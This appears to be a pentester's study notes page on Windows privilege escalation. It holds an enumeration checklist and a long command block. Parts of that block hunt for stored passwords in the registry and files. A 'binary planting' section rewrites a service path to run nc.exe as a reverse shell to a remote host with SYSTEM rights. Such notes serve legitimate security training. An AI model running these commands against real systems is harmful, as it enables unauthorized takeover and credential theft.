
# Guide

1. Repeat below under every single privilege increase
2. Run [[#Default Commands]]
3. Check the users on the victim, `net users`


# Table of Contents

1. If a binary is found within a users directory it is likely exploitable.
2. General guide which lists a vast array of exploits and methods of exploitation, see [Privilege Escalation - Windows](https://mysecurityjournal.blogspot.com/p/client-side-attacks.html)
3. See [[Watson]] to find operating system vulnerabilities  
4. Flags may be within network drives, try mapping, see [[Network Drives]]:
5. If any [[Valuable Files#SAM and System Files]] are found, see [[SamDump]]
6. If you have a hash which you cannot crack, see [[Passing the Hash]]
7. If internal ports are found they can be probed by [[Powercat]] 

#### Walkthroughs

1. [OSCP\_Cheat\_sheet/Windows Privilege Escalation Techniques.md at main · xXxhagenxXx/OSCP\_Cheat\_sheet · GitHub](https://github.com/xXxhagenxXx/OSCP_Cheat_sheet/blob/main/Windows%20Privilege%20Escalation%20Techniques.md)
2. [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
3. [Privilege Escalation - Windows · Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
# Default Commands 

1. [[windows-privesc-check]]
2. [[WinPeas]]
3. [[Windows Exploit Suggester - Next Generation (WES-NG)]]



# Extra Enumeration Commands

```
// What system are we connected to?
Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
Get-WmiObject -Class win32_Process 
Get-WmiObject -Class win32_Service
Get-WmiObject -Class win32_Bios
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

// Get tokens and privileges 
whoami /priv
Get-WmiObject win32_useraccount | Select name,sid

// Get the hostname and username (if available)
hostname
echo %username%

// Get users
net users
net user [username]

// Get groups
get-LocalGroup | ft Name, SID

// Networking stuff
ipconfig /all

// Printer?
route print

// ARP-arific
arp -A

// Which protection settings enabled
Get-MpComputerStatus

// Active network connections
netstat -ano

// Firewall fun (Win XP SP2+ only)
netsh firewall show state
netsh firewall show config
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

// Scheduled tasks
schtasks /query /fo LIST /v

// Running processes to started services
tasklist /SVC
net start

// Driver madness
DRIVERQUERY

// WMIC fun (Win 7/8 -- XP requires admin)
wmic /?
# Use wmic_info script!

// [[Saved Credentials]] 
cmdkey /list

// WMIC: check patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic service get name,displayname,pathname,startmode
wmic service get name,displayname,pathname,startmode |findstr /i "auto"
wmic product get name, version, vendor

// Search pathces for given patch
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

// AlwaysInstallElevated fun
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

// AutoRun (See [[AutoRun SysInternals]])
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run

// [[Registry Passwords]] 
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

// Other commands to run to hopefully get what we need
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

// Service permissions
sc query
sc qc [service_name]
sc qc dllsvc (See [[DLL Hijacking]] )
sc qc regsvc (If NT Auth, see [[RegSVC Writable]])
sc qc filepermsvc (If SYSTEM SERVICE_START_NAME, see [[Insecure Service Executables]])

// Accesschk stuff
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe /accepteula -uwcqv user daclsvc
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

// Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

// Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*

// Binary planting
sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]

driverquery /v /fo csv
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select Object ‘Display Name’, ‘Start Mode’, Path
```